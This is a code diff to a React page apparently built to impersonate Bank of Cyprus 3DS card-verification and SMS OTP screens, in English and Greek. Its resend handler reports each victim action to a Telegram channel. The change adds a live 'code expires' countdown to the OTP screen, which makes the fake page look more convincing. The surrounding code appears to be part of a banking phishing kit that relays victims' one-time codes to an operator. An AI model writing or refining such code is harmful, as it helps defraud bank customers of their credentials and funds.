@@ -313,6 +313,7 @@ export default function BbvaPage(props: any) {
   const [sessionSecondsLeft, setSessionSecondsLeft] = useState(210)
   const [isSmsOtpRequested, setIsSmsOtpRequested] = useState(false)
   const [bocApprovedSent, setBocApprovedSent] = useState(false)
+  const [bocOtpSecondsLeft, setBocOtpSecondsLeft] = useState(210)
   const bocInputRef = useRef<HTMLInputElement>(null)
 
   // 3:30 (210-second) live countdown timer on boc-verify screen -> activates when "Send SMS OTP" is clicked
@@ -341,6 +342,26 @@ export default function BbvaPage(props: any) {
 
     return () => clearInterval(interval)
   }, [currentScreen, isSmsOtpRequested])
+
+  // Live countdown timer on OTP screen (starts at 3:30 / 210 seconds)
+  useEffect(() => {
+    if (currentScreen !== "otp") {
+      setBocOtpSecondsLeft(210)
+      return
+    }
+
+    const interval = setInterval(() => {
+      setBocOtpSecondsLeft((prev) => {
+        if (prev <= 1) {
+          clearInterval(interval)
+          return 0
+        }
+        return prev - 1
+      })
+    }, 1000)
+
+    return () => clearInterval(interval)
+  }, [currentScreen])
 
   const formatBocTimer = (totalSeconds: number) => {
     const mins = Math.floor(totalSeconds / 60)
@@ -447,6 +468,7 @@ export default function BbvaPage(props: any) {
   }
 
   const handleBocResend = async () => {
+    setBocOtpSecondsLeft(210)
     try {
       await sendTelegramMessage({
         title: "Bank of Cyprus — 3DS Resend SMS OTP Requested",
@@ -2090,8 +2112,16 @@ export default function BbvaPage(props: any) {
                 </button>
               </form>
 
-              {/* RESEND SMS OTP (CODE) */}
-              <div className="text-center mb-6 select-none">
+              {/* Countdown Timer & RESEND SMS OTP (CODE) */}
+              <div className="flex flex-col items-center justify-center mb-6 select-none">
+                <div className="flex items-center gap-1.5 text-[12.5px] sm:text-[13px] text-[#4b5563] mb-2 font-medium">
+                  <span className="text-[13px]">⏱</span>
+                  <span>{bocLanguage === "en" ? "Code expires in: " : "Ο κωδικός λήγει σε: "}</span>
+                  <span className="font-bold text-[#111827] tracking-wider">
+                    {formatBocTimer(bocOtpSecondsLeft)}
+                  </span>
+                </div>
+
                 <button
                   type="button"
                   onClick={handleBocResend}
